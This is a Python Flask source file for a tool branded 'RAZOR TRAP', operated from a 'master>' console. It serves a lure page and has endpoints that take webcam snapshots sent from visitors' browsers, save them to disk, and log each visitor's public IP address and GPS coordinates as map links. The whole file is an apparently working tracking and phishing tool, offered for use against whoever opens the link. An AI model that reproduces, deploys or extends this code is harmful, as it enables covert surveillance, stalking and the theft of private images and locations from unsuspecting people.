import sys
import os
import time
import requests
import base64
import signal
from flask import Flask, render_template, jsonify, request, url_for
from multiprocessing import Process

app = Flask(__name__)

R = '\033[31m'
Y = '\033[33m'
B = '\033[34m'
W = '\033[0m'
C = '\033[36m'
G = '\033[32m'
M = '\033[35m'

ascii_art1 = f"""
{B}⠀⠀⠀⠀⠀       ⢀⣴⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠾⠛⠉⠀⠙⠛⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀
{R}⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⡀⠀⠀⢀⣠⠤⠴⠶⢤⣄⡀⠈⣿⡇⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⢠⡞⠉⢻⣷⠟⠉⠀⠈⠙⠒⠶⠮⠿⢿⣿⠃⠀⠀⠀⠀⠀⠀
{B}⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣦⣈⠙⠳⢦⣄⠀⠀⠀⠀⠀⠈⠙⠳⣄⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣶⣄⠀⠙⢿⣿⠛⠛⠙⢦⡀⠀⠈⠙⢦⡀⠀⠀
{G}⠀⠀⠀⣀⣴⠟⠉⠉⠙⠻⣿⣿⣿⣿⣷⣄⣀⣽⣶⣤⣴⠟⠻⣦⠀⠀⠀⠙⢦⠀
{R}⠀⠀⢰⣿⣿⣿⣷⣤⣀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⠿⠟⠀⠀⠈⠳⢦⣀⠀⢸⡄
{Y}⠀⢠⡟⠁⠀⠀⠉⠛⠿⣿⣶⣄⡀⠀⠙⠿⠿⠿⠟⢀⣤⡾⠿⠛⠓⠒⠚⠛⠛⠁
{B}⠀⠈⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⢹⣿⣿⣿⣿⣿⣿⠏⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀
{Y}⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠉⠉⠙⠛⠉⠀⠀⠀⠀⠘⠳⣄⠀⠀⠀⠀⠀
{G}⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢦⣄⠀⠀⠀
{R}⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀
{M}⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⠀
{W}⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇
"""

ascii_art2 = f"""
{R}          ███████{Y}░░░░{R}███████
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
       ██{Y}░░░░░██{R}░░██{Y}░░░░░██
    ███████{Y}░░░░░{R}███████
   ██{Y}░░░░░░░░░░░░░░{R}██
  ██{Y}░░░░░░░░░░░░░░░░{R}██
 ██{Y}░░░░░░░░░░░░░░░░░░░░{R}██
██{Y}░░░░░░░░░░░░░░░░░░░░░░░░{R}██
  ░░ ░░░░░░░░░░░░░░░░░░░░░░ ░░ 
{B}      R A Z O R   T R A P
{W}
"""

enable_camera = False
enable_ip = False
enable_location = False

def show_ascii_art():
    combined_art = '\n'.join(line1 + '   ' + line2 for line1, line2 in zip(ascii_art1.splitlines(), ascii_art2.splitlines()))
    print(combined_art)


def print_help():
    print(f"""{G}
╔════════════════════════════════════════════════════════════╗
║                      Command Help Guide                    ║
╠════════════════════════════════════════════════════════════╣
║  {Y}start -c{W}        : Enable camera access                    {G}║
║  {Y}start -ip{W}       : Retrieve public IP                      {G}║
║  {Y}start -Lc{W}       : Access location                         {G}║
║  {Y}start all{W}       : Enable all functionalities              {G}║
║  {Y}open --help{W}     : Show this help message                  {G}║
╚════════════════════════════════════════════════════════════╝{W}
""")

def info_frist():
    print(f"""{Y}
    {B}||{W}                                      {C}||
    {B}||{W}    {M}Use command the "start" prefix{W}    {C}||
    {B}||{W}                                      {C}||{W}
{Y}open --help : view commands{W}
""") 

def run_server():
    app.run(port=4040)

@app.route("/")
def index():
    return render_template("index.html", enable_camera=enable_camera, enable_ip=enable_ip, enable_location=enable_location)

@app.route('/get_ip', methods=['GET'])
def get_ip():
    if enable_ip:
        ip = requests.get('https://api.ipify.org?format=json').json()['ip']
        print(f"{G}Public IP accessed from the web: {ip}{W}")  
        return jsonify({'ip': ip})
    return jsonify({'error': 'IP retrieval is disabled'}), 403

@app.route("/get_location", methods=["POST"])
def get_location():
    if enable_location:
        data = request.json
        latitude = data.get("latitude")
        longitude = data.get("longitude")
        location_url = f"https://www.google.com/maps?q={latitude},{longitude}"
        return jsonify({"location_url": location_url})
    return jsonify({'error': 'Location retrieval is disabled'}), 403

@app.route("/capture_image", methods=["POST"])
def capture_image():
    if enable_camera:
        image_data = request.json.get("image_data")
        image_filename = f"image_{int(time.time())}.png"
        image_path = os.path.join("static/result/image", image_filename)
        
        with open(image_path, "wb") as img_file:
            img_file.write(base64.b64decode(image_data))

        image_url = url_for('static', filename=f'result/image/{image_filename}', _external=True)
        return jsonify({"status": "success", "image_url": image_url})
    return jsonify({'error': 'Camera capture is disabled'}), 403


@app.route('/send_ip', methods=['POST'])
def send_ip():
    data = request.get_json()
    ip_address = data.get('ip')
    print(f"IP Publik: {ip_address}")
    return jsonify({'status': 'success'})
    
@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    location_url = data.get("location_url")
    print(f"User Location: {location_url}")
    return jsonify({"status": "success"})


def interactive_prompt():
    global enable_camera, enable_ip, enable_location
    server_process = None

    while True:
        try:
            command = input(f"{B}master>{W}$ ").strip().lower()
        
            if command == "open --help":
                print_help()
                # Do not start the server
                continue
            
            elif command == "start -c":
                enable_camera = True
                enable_ip = enable_location = False
                print(f"{G}Camera access enabled.{W}")
            
            elif command == "start -ip":
                enable_ip = True
                enable_camera = enable_location = False
                print(f"{G}IP retrieval enabled.{W}")
            
            elif command == "start -lc":
                enable_location = True
                enable_camera = enable_ip = False
                print(f"{G}Location access enabled.{W}")
            
            elif command == "start all":
                enable_camera = enable_ip = enable_location = True
                print(f"{G}All functionalities enabled (camera, IP, location).{W}")

            elif command == "":
                # Ignore empty input
                continue

            else:
                print(f"{R}Note*: Use --help to see available commands.{W}")
                # Do not start the server
                continue
            
            # Start the server only for valid commands that enable functionalities
            if server_process is None or not server_process.is_alive():
                server_process = Process(target=run_server)
                server_process.start()

        except KeyboardInterrupt:
            # Handle CTRL+C
            if server_process and server_process.is_alive():
                server_process.terminate()
                print(f"\n{R}Server stopped. Returning to master prompt.{W}")
            else:
                print(f"\n{R}Exiting main script.{W}")
                sys.exit(0)


if __name__ == "__main__":
    show_ascii_art()
    info_frist()
    interactive_prompt()
